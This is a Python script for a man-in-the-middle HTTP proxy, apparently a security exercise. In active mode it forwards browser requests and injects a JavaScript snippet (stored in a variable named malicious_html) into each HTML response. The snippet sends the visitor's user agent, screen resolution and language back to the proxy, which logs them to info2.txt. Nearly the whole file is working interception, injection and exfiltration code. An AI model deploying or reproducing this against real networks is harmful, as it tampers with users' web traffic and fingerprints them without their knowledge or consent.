
import argparse
import socket
import threading
import re
from urllib.parse import unquote
import netifaces

DEBUG = True
PROXY_IP = None
PROXY_IP_INTERFACE = "0.0.0.0"

def parse_and_log_client_data(request_data):
    """
    Parses the GET request with client data and logs it to info2.txt.
    """
    if DEBUG:
        print("Parsing and logging client data...")
    user_agent = re.search(r'user-agent=([^&]+)', request_data)
    screen_res = re.search(r'screen=([^&]+)', request_data)
    language = re.search(r'lang=([^&\s]+)', request_data)

    with open("info2.txt", "a") as f:
        if user_agent:
            f.write("User-Agent: {}\n".format(unquote(user_agent.group(1))))
        if screen_res:
            f.write("Screen Resolution: {}\n".format(unquote(screen_res.group(1))))
        if language:
            f.write("Language: {}\n".format(unquote(language.group(1))))
        f.write("\n")
        print("Client data logged to info2.txt.")

def get_destination_host_port(request_data):
    """
    Parses the HTTP request to extract the destination host and port.
    """
    lines = request_data.splitlines()
    for line in lines:
        if line.startswith("Host:"):
            host_line = line.split(" ")
            if len(host_line) >= 2:
                host = host_line[1].strip()
                # Check if port is specified in the host line
                if ":" in host:
                    host, port = host.split(":")
                    return host, int(port)
                return host, 80  # Default port for HTTP
    return None, None  # Host not found in the request

def modify_content_length_header(response_data, len_js_code):
    if DEBUG:
        print("Modifying Content Length header...")
   # Split the response into headers and body

    if "Content-Length: " in response_data:
        content_length = int(re.search(r"Content-Length: (\d+)\r\n", response_data).group(1))
        response_data = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {content_length + len_js_code}\r\n", response_data)

    return response_data



def inject_javascript(response_data):
    #if DEBUG:
        #print("Injecting JavaScript...")
        #print("Response is:\n{}".format(response_data))
    js_code = """
        <script>
            var user_agent = window.navigator.userAgent;
            var screen_res = window.screen.width.toString() + 'x' + window.screen.height.toString();
            var language = window.navigator.language;
            var url = 'http://' + '{proxy_ip}' + ':' + {proxy_port} + '/?user-agent=' + user_agent + '&screen=' + screen_res + '&lang=' + language;
            var xhttp = new XMLHttpRequest();
            xhttp.open("GET", url, true);
            xhttp.send();
        </script>
    """
    response_data = modify_content_length_header(response_data, len(js_code))
    js_code = js_code.replace("{proxy_ip}", "127.0.0.1") #PROXY_IP
    js_code = js_code.replace("{proxy_port}", str(8080))

    # Find the position of the </body> tag
    body_end_index = response_data.lower().find("</body>")
    
    # If </body> tag is found
    if body_end_index != -1:
        # Split the response data
        part1 = response_data[:body_end_index]
        part2 = response_data[body_end_index:]
        # Reassemble with the JavaScript injected
        malicious_html = part1 + js_code + part2
    else:
        # If </body> tag is not found, append the JavaScript at the end
        malicious_html = response_data + js_code

    #if DEBUG:
        #print("Malicious HTML content:\n{}".format(malicious_html))
    return malicious_html


def handle_active_client(client_socket):
    request = client_socket.recv(8192)
    request = request.replace(b'\r\n\r\n', b'\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n')
    request = request.decode('utf-8')

    print("Received request")

     # Handle the GET request with client data
    if '/?user-agent=' in request:
        parse_and_log_client_data(request)
        # Send a simple HTTP response (acknowledgment)
        #client_socket.sendall("HTTP/1.1 200 OK\r\n\r\n".encode('utf-8'))
        client_socket.close()
        return

    host, port = get_destination_host_port(request)
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.connect((host, 80))
    server_socket.send(request.encode('utf-8'))


    response_data = b""
    c = 0
    server_socket.settimeout(5)
    while True:
        try:
            chunk = server_socket.recv(8192) 
            print(c)
            c += 1
            print('Len of chunk: ',len(chunk) )
            # Check if the end of the HTML content has been reached
            if len(chunk) == 0:
                break
            response_data += chunk
        except socket.timeout:
            break
    print("Receieved all chunks")
    response = response_data.decode('utf-8')
    if response:
        #if 'text/html' in response:
        response = inject_javascript(response)
        client_socket.send(response.encode('utf-8'))
        print("Response sent to client.")
        print("Response is:\n{}".format(response))

    #client_socket.close()
    #server_socket.close()




""""""""""""""""" BELOW OK """""""""""""""""""""

def proxy_active(listening_ip, listening_port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((PROXY_IP_INTERFACE, int(listening_port)))
    server.listen(5)
    print("Proxy server listening on {}:{}".format(PROXY_IP_INTERFACE, listening_port))

    while True:
        client_socket, client_address = server.accept()
        if client_address[0] != listening_ip:
            print("Invalid client IP. Exiting...")
            exit(1)
        print("Client connected from {}:{}".format(client_address[0], client_address[1]))
        client_thread = threading.Thread(target=handle_active_client, args=(client_socket, ))
        client_thread.start()


def proxy_passive(listening_ip, listening_port):
    print("Not implemented yet.")

def main():
    parser = argparse.ArgumentParser(description='Proxy', add_help=False)
    parser.add_argument('-m', '--mode', default=None, help='Mode of operation [active/passive].')
    parser.add_argument('-i', '--listening_ip', default=None, help='IP address to listen on.')
    parser.add_argument('-p', '--listening_port', default=None, help='Port to listen on.')

    args = parser.parse_args()
    print("Arguments: {}".format(args))

    if DEBUG:
        args.listening_ip = "127.0.0.1"
        args.listening_port = "8080"
        args.mode = "active"
    
    if args.listening_ip is None:
        print("No listening IP provided. Exiting...")
        exit(1)
    
    if args.listening_port is None:
        print("No listening port provided. Exiting...")
        exit(1)

    gateways = netifaces.gateways()
    interface = gateways['default'][netifaces.AF_INET][1]
    global PROXY_IP
    PROXY_IP = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']    

    if args.mode == "active":
        proxy_active(args.listening_ip, args.listening_port)
    elif args.mode == "passive":
        proxy_passive(args.listening_ip, args.listening_port)
    else:
        print("Invalid mode provided. Exiting...")
        exit(1)
    

if __name__ == "__main__":
    main()